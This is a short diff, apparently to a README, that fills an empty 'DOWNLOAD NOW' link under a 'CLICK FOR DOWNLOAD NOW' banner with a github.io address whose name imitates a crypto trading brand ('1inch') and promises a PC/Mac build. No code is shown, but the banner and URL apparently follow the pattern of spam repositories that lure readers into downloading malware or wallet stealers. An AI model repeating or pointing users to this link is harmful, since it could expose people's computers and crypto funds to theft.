@@ -4,7 +4,7 @@
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://1inch-tradiot-pcwinmac-te55.github.io/.github/ ) |
  |---------------------|----------------------:|
 
 
